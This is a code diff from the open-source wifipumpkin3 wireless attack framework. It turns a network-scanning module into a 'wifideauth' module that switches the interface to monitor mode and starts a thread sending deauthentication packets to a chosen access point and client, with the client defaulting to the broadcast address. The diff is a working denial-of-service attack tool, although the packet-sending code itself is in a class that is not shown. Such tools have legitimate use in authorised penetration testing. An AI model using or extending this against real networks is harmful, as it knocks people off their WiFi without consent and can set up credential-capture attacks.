@@ -11,6 +11,7 @@ from multiprocessing import Process
 from scapy.all import *
 from wifipumpkin3.core.common.platforms import Linux
 from tabulate import tabulate
+from wifipumpkin3.core.packets.wireless import ThreadDeauth
 
 # This file is part of the wifipumpkin3 Open Source Project.
 # wifipumpkin3 is licensed under the Apache 2.0.
@@ -35,12 +36,17 @@ DOT11_REQUEST_SUBTYPE = 2
 
 
 class ModPump(ModuleUI):
-    """ Scan WiFi networks and detect devices"""
+    """ Sends deauthentication packets to a wifi network AP """
 
-    name = "wifiscan"
+    name = "wifideauth"
 
     options = {
         "interface": ["wlxc83a35cef744", "Name network interface wireless "],
+        "target": ["00:00:00:00:00:00", "the device MAC Address from Device to deauth"],
+        "client": [
+            "ff:ff:ff:ff:ff:ff",
+            "the device MAC Address from client to desconnect",
+        ],
         "timeout": [0, "Time duration of scan network wireless (ex: 0 infinty)"],
     }
     completions = list(options.keys())
@@ -63,8 +69,8 @@ class ModPump(ModuleUI):
         self.table_output = []
         super(ModPump, self).__init__(parse_args=self.parse_args, root=self.root)
 
-    def do_run(self, args):
-        """ execute module """
+    def do_scan(self, args):
+        """ start scanner wireless networks AP"""
         print(
             display_messages(
                 "setting interface: {} monitor momde".format(
@@ -91,6 +97,44 @@ class ModPump(ModuleUI):
         self.p.terminate()
         self.set_monitor_mode()
         print(display_messages("thread sniffing successfully stopped", info=True))
+
+    def do_run(self, args):
+        """ execute deauth module attack """
+        client_mac = self.options.get("client")[0]
+        target_mac = self.options.get("target")[0]
+        interface = self.options.get("interface")[0]
+        print(display_messages("Options", info=True, sublime=True))
+        print(
+            display_messages(
+                "client:| {} |".format(setcolor(client_mac, color="blue")), info=True
+            )
+        )
+        print(
+            display_messages(
+                "target:| {} |".format(setcolor(target_mac, color="red")), info=True
+            )
+        )
+        if "00:00:00:00:00:00" in self.options.get("target")[0]:
+            print(
+                display_messages(
+                    "please, select a target to deauth attack ", error=True
+                )
+            )
+            return
+        print(
+            display_messages(
+                "enable interface: {} to monitor mode".format(interface), info=True
+            )
+        )
+        self.set_monitor_mode("monitor")
+        self.thread_deauth = ThreadDeauth(target_mac, client_mac, interface)
+        self.thread_deauth.setObjectName("wifideauth")
+        self.thread_deauth.start()
+
+    def do_stop(self, args):
+        """ stop attack deauth module """
+        if hasattr(self, "thread_deauth"):
+            self.thread_deauth.stop()
 
     def channel_hopper(self, interface):
         while True:
